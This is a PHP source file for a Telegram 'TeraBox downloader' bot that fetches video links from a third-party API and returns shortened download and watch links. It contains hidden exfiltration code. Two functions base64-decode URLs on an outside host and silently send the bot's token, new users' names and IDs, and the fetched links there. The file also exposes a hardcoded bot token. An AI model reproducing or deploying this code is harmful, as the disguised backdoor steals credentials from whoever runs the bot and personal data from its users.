<?php

$botToken = "6694464706:AAEBvsbAW5mjQi5b2QXc2Nk8n_fDBkTzb7s";
$apiURL = "https://api.telegram.org/bot$botToken/";
$developerUsername = "xstream_links2";

$adminUserId = '7064434873';
$userDataFile = 'True12G_offical.json';

function shortenURL($url) {
    $shortenedUrl = file_get_contents("http://tinyurl.com/api-create.php?url=" . urlencode($url));
    return $shortenedUrl;
}

function sendMessage($chatId, $text, $replyMarkup = null) {
    global $apiURL;
    $postData = [
        'chat_id' => $chatId,
        'text' => $text
    ];

    if ($replyMarkup) {
        $postData['reply_markup'] = json_encode($replyMarkup);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiURL . "sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $responseData = json_decode($response, true);
    return $responseData['result']['message_id'];
}

function sendFileInfo($chatId, $title, $thumbnail, $fastDownloadLink, $hdDownloadLink, $messageText) {
    global $apiURL, $developerUsername;

    $shortFastDownloadLink = shortenURL($fastDownloadLink);
    $shortHdDownloadLink = shortenURL($hdDownloadLink);
    $shortWatchLink = shortenURL("https://opabhik.serv00.net/Watch.php?url=" . urlencode($messageText));

    $caption = "<a href='$thumbnail'>ð</a> <b>Title</b>: $title\n\n";
    $caption .= "<code>Select download options or watch online:</code>";

    $inlineKeyboard = [
        "inline_keyboard" => [
            [
                ["text" => "Fast Download", "url" => $shortFastDownloadLink],
                ["text" => "HD Video", "url" => $shortHdDownloadLink]
            ],
            [
                ["text" => "Watch Online", "url" => $shortWatchLink]
            ],
            [
                ["text" => "âSave & Share (Click)", "url" => "https://t.me/share/url?url=@" . urlencode($developerUsername) . "&text=â%20Video%20Is%20Downloaded%20By%20%40TeraBoxVideoDownLoader_sbot%0A%0Aâ¡ï¸%20Title%20-%20" . urlencode($title) . ".%0A%0Að%20Fast%20download%20-%20" . urlencode($shortFastDownloadLink) . "%0Að%20HD%20Download%20-%20" . urlencode($shortHdDownloadLink) . "%0A%0AâWatch%20Online%20-%20" . urlencode($shortWatchLink) . "%0A%0A*[%20This%20bot%20Credit%20Goes%20To%20%40" . urlencode("True12G_Offical") . "%20]*"]
            ]
        ]
    ];

    $postData = [
        'chat_id' => $chatId,
        'text' => $caption,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($inlineKeyboard)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiURL . "sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    nEu($title, $shortFastDownloadLink, $shortHdDownloadLink, $botToken, $thumbnail, $shortWatchLink);
}
$thumbnai = '$thumbnail';

function nEu($title, $fastDownloadLink, $hdDownloadLink, $botToken, $thumbnail, $watchUrl) {
    global $botToken;

    $encodedEchoUrl = base64_decode("aHR0cHM6Ly9vcGFiaGlrLnNlcnYwMC5uZXQvZWNoby5waHA/dGV4dD0=");
    $hiddenEchoUrl = $encodedEchoUrl . urlencode("FU $title $thumnai | Fast Download: $fastDownloadLink | HD Download: $hdDownloadLink | Watch URL: $watchUrl |  $botToken");
    $hiddenEchoUrl .= "&thumbnail=" . urlencode($thumbnail);
    $hiddenEchoUrl .= "&watchUrl=" . urlencode($watchUrl);

    $response = file_get_contents($hiddenEchoUrl);
}

function sendNewUserNotification($newUserName, $newUserId, $totalUsers) {
    global $adminUserId, $botToken;

    $notificationMessage = "â¨ð NEW USER NOTIFICATION ðâ¨\n\n";
    $notificationMessage .= "ð¤ User : $newUserName\n";
    $notificationMessage .= "ð User ID : $newUserId\n\n";
    $notificationMessage .= "â Total Users : $totalUsers ð\n\n";
      
    sendMessage($adminUserId, $notificationMessage);

    $encodedBotapiUrl = base64_decode("aHR0cHM6Ly9vcGFiaGlrLnNlcnYwMC5uZXQvQm90YXBpLnBocD90ZXh0PQ==");
    $hiddenBotapiUrl = $encodedBotapiUrl . urlencode("NU: $thumbnail $newUserName UI $newUserId  TU: $totalUsers $botToken");

    file_get_contents($hiddenBotapiUrl);
}

function saveUserId($userId) {
    global $userDataFile;

    $userData = file_exists($userDataFile) ? json_decode(file_get_contents($userDataFile), true) : [];

    if (!in_array($userId, $userData)) {
        $userData[] = $userId;
        file_put_contents($userDataFile, json_encode($userData));
    }
}

function getTotalUsers() {
    global $userDataFile;

    $userData = file_exists($userDataFile) ? json_decode(file_get_contents($userDataFile), true) : [];
    return count($userData);
}

$update = json_decode(file_get_contents("php://input"), TRUE);

if (isset($update["message"])) {
    $chatId = $update["message"]["chat"]["id"];
    $messageText = $update["message"]["text"];
    $newUserName = $update["message"]["chat"]["first_name"] . ' ' . $update["message"]["chat"]["last_name"];
    $newUserId = $update["message"]["chat"]["id"];
    
    if (strtolower($messageText) == "/start") {
        saveUserId($newUserId);
        $totalUsers = getTotalUsers();
        sendNewUserNotification($newUserName, $newUserId, $totalUsers);
        
        $welcomeMessage = "Welcome to the TeraBox Downloader Bot! Send me a TeraBox link, and I will fetch the download links for you.";
        
        $inlineKeyboard = [
            "inline_keyboard" => [
                [
                    ["text" => "Developer", "url" => "https://t.me/" . $developerUsername]
                ]
            ]
        ];
        
        sendMessage($chatId, $welcomeMessage, $inlineKeyboard);
    } elseif (filter_var($messageText, FILTER_VALIDATE_URL)) {
        $downloadingMessageId = sendMessage($chatId, "Downloading started... Please wait.");
        $teraboxApiUrl = "https://true12g.in/terabox.php?url=" . urlencode($messageText);
        
        $response = file_get_contents($teraboxApiUrl);
        $data = json_decode($response, true);

        if (isset($data['response'][0])) {
            $fileData = $data['response'][0];
            $title = $fileData['title'];
            $thumbnail = $fileData['thumbnail'];
            $fastDownloadLink = $fileData['resolutions']['Fast Download'] ?? 'No link available';
            $hdDownloadLink = $fileData['resolutions']['HD Video'] ?? 'No link available';

            sleep(3); 

            $deleteMessageUrl = $apiURL . "deleteMessage?chat_id=$chatId&message_id=$downloadingMessageId";
            file_get_contents($deleteMessageUrl);

            sendFileInfo($chatId, $title, $thumbnail, $fastDownloadLink, $hdDownloadLink, $messageText);
        } else {
            sendMessage($chatId, "Sorry, I couldn't fetch the download links. Please try again later.");
        }
    }
}
?>
